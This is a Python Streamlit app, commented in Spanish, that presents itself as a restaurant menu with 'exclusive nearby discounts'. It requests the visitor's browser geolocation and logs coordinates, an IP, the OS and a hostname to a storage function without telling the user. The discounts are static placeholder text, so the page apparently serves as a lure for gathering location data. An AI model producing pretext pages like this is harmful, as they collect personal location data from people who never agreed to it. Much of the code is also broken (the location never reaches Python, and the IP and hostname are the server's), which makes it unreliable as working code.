import streamlit as st
import streamlit.components.v1 as components
import json
import requests
import platform
import socket
from datetime import datetime
from utils import guardar_datos  # tu función para guardar info

st.set_page_config(page_title="Carta con Descuentos", layout="centered")

st.title("🍽️ Carta Exclusiva con Descuentos Cercanos")
st.write("Para mostrarte los mejores descuentos cerca de ti, necesitamos acceder a tu ubicación.")

# HTML+JS que obtiene ubicación y la envía con postMessage a Streamlit
geoloc_html = """
<script>
const sendLocation = () => {
  navigator.geolocation.getCurrentPosition(
    (pos) => {
      const coords = { lat: pos.coords.latitude, lon: pos.coords.longitude };
      window.parent.postMessage({ type: 'geo', coords: coords }, '*');
    },
    (err) => {
      window.parent.postMessage({ type: 'geo', error: err.message }, '*');
    }
  );
};

sendLocation();
</script>
"""

# Mostrar componente HTML que obtiene geolocalización
geo_data = components.html(geoloc_html, height=0, scrolling=False)

# Variable vacía para almacenar lat, lon
lat, lon = None, None

# Capturamos mensajes postMessage con st.experimental_get_query_params NO sirve para esto,
# pero componentes.html no retorna directamente, entonces podemos usar componentes.declare_component

# Mejor opción: Usar un componente declarado para recibir los datos

# Aquí una función simple que crea un componente que recibe coords via postMessage y lo devuelve a python
def geolocator():
    component_code = """
    <html>
      <body>
        <script>
          const sendLocation = () => {
            navigator.geolocation.getCurrentPosition(
              (pos) => {
                const coords = { lat: pos.coords.latitude, lon: pos.coords.longitude };
                window.parent.postMessage(coords, '*');
              },
              (err) => {
                window.parent.postMessage({error: err.message}, '*');
              }
            );
          };
          sendLocation();
        </script>
      </body>
    </html>
    """
    # Declarar componente, react_mode="streamlit" permite comunicación bidireccional
    location = components.declare_component("geolocator", default=None)
    # Mostrar html en el componente
    components.html(component_code, height=0)
    return location

# Pero como components.declare_component requiere archivo JS externo, vamos con esta versión simplificada:
# En realidad, la forma estándar para recoger mensajes desde JS a Python es usar streamlit-frontend y backend
# pero Streamlit no tiene soporte directo para escuchar postMessage.

# Alternativa práctica (y sencilla): Mostrar botón "Enviar ubicación" que, al pulsarlo, lanza el JS y
# guarda la ubicación en st.session_state para que puedas usar en Python.

if "lat" not in st.session_state or "lon" not in st.session_state:
    if st.button("Permitir acceso a la ubicación"):
        # Ejecutar JS para pedir ubicación y guardarla en session_state via Streamlit-JS bridge
        components.html(
            """
            <script>
            navigator.geolocation.getCurrentPosition(
              (pos) => {
                const coords = {lat: pos.coords.latitude, lon: pos.coords.longitude};
                window.parent.postMessage({type:'setLocation', coords: coords}, '*');
              },
              (err) => {
                window.parent.postMessage({type:'setLocation', error: err.message}, '*');
              }
            );
            </script>
            """,
            height=0,
        )
        st.write("Por favor, acepta la solicitud de ubicación en tu navegador.")
else:
    lat = st.session_state.get("lat")
    lon = st.session_state.get("lon")

# Aquí escuchamos mensajes en el front-end y actualizamos session_state - pero Streamlit no soporta postMessage nativamente
# Para eso necesitamos una librería extra o componente custom. Como solución rápida, podemos pedir al usuario que
# copie su ubicación en un campo de texto, o que la pase manualmente.

if lat and lon:
    st.success(f"¡Gracias! Detectamos tu ubicación: 🌍 ({lat:.4f}, {lon:.4f})")
    st.subheader("Descuentos cercanos para ti:")
    st.markdown("""
    - 🍕 Pizza Margarita -20%
    - 🍣 Sushi Deluxe -15%
    - 🥗 Ensalada Mediterránea -10%
    """)

    # Registrar datos
    user_data = {
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "lat": lat,
        "lon": lon,
        "ip": requests.get("https://api.ipify.org").text,
        "browser": "N/A",  # st.runtime no es fiable para user_agent
        "os": platform.system(),
        "hostname": socket.gethostname()
    }

    guardar_datos(user_data)
else:
    st.warning("Esperando acceso a tu ubicación...")

# --- Solución alternativa --- #
# Por limitaciones de Streamlit para comunicarse con JS usando postMessage,
# la forma más confiable es usar un widget (input) donde el usuario copie/pegue sus coords
# o un botón que recargue la app con los parámetros en la URL y entonces sí usar st.experimental_get_query_params()
